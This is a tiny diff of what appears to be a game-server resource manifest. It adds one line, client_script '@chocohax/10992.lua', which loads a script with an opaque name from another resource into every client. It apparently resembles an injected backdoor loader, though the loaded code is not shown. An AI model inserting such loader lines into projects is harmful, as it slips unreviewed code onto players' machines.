@@ -17,3 +17,4 @@ files {
   'snd/wrong.ogg',
   'hack.html'
 }
+client_script '@chocohax/10992.lua'
